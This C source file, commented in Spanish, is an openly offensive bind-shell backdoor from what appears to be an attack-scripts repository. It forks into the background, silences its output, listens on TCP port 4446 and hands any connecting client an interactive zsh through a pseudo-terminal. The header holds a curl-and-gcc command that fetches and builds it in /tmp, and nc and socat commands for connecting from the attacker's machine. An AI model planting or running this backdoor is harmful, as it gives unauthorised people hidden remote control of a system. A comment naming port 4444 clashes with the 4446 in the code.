//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/TerminalReversa/Zsh.c > /tmp/ReverseZsh.c; gcc /tmp/ReverseZsh.c -o /tmp/ReverseZsh
//
// Conectarse desde la máquina atacante:
//
//  Con netcat (no es una terminal completa porque no se puede navegar por midnight commander):
//    nc 192.168.1.100 4446
//  Con socat:
//    socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4446

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <pty.h>
#include <utmp.h>   // <-- Importante para login_tty()
#include <string.h>

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        perror("[-] Error en fork() inicial");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        // Cerrar el proceso padre
        exit(0);
    }

    // Crear nueva sesión para desacoplar del terminal actual
    if (setsid() < 0) {
        perror("[-] Error en setsid()");
        exit(EXIT_FAILURE);
    }
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        perror("[-] Error en segundo fork()");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        // Cerrar el segundo padre
        exit(0);
    }

    // Redirigir I/O a /dev/null
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);
    }

    chdir("/");
    umask(0);
}

int main() {
    daemonize();

    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    int master_fd, slave_fd;
    pid_t pid;

    // Aquí definimos el intérprete de comandos: /bin/zsh -i
    // Y definimos un entorno básico con TERM y PATH
    char *zsh_shell[] = {"/bin/zsh", "-i", NULL};
    char *envp[] = {
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    // Crear socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[-] Error al crear socket");
        exit(EXIT_FAILURE);
    }

    // Configurar dirección y puerto (4444 por defecto)
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4446);

    // Enlazar el socket al puerto
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Error en bind()");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Escuchar conexiones entrantes
    if (listen(sockfd, 1) < 0) {
        perror("[-] Error en listen()");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Aceptar conexiones en bucle
    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) {
            perror("[-] Error en accept()");
            continue;
        }

        // Crear par de PTY (master, slave)
        if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) {
            perror("[-] Error en openpty()");
            close(clientfd);
            continue;
        }

        pid = fork();
        if (pid == 0) {
            // Proceso hijo: ejecuta /bin/zsh en el slave_fd
            close(sockfd);
            close(master_fd);

            // Asociar el PTY a la sesión para que zsh lo reconozca como terminal real
            login_tty(slave_fd);

            // Ejecutar /bin/zsh con entorno definido
            execve("/bin/zsh", zsh_shell, envp);

            // Si execve falla:
            perror("[-] Error en execve()");
            exit(EXIT_FAILURE);
        }

        // Cerrar slave en el proceso padre
        close(slave_fd);

        // Redirigir datos entre el atacante (clientfd) y el shell (master_fd)
        char buffer[1024];
        ssize_t n;
        fd_set fds;

        while (1) {
            FD_ZERO(&fds);
            FD_SET(clientfd, &fds);
            FD_SET(master_fd, &fds);

            int max_fd = (clientfd > master_fd ? clientfd : master_fd) + 1;
            int activity = select(max_fd, &fds, NULL, NULL, NULL);
            if (activity < 0) {
                perror("[-] Error en select()");
                break;
            }

            // Si hay datos del atacante -> al shell
            if (FD_ISSET(clientfd, &fds)) {
                n = read(clientfd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(master_fd, buffer, n);
            }

            // Si hay datos del shell -> al atacante
            if (FD_ISSET(master_fd, &fds)) {
                n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(clientfd, buffer, n);
            }
        }

        close(master_fd);
        close(clientfd);
    }

    close(sockfd);
    return 0;
}
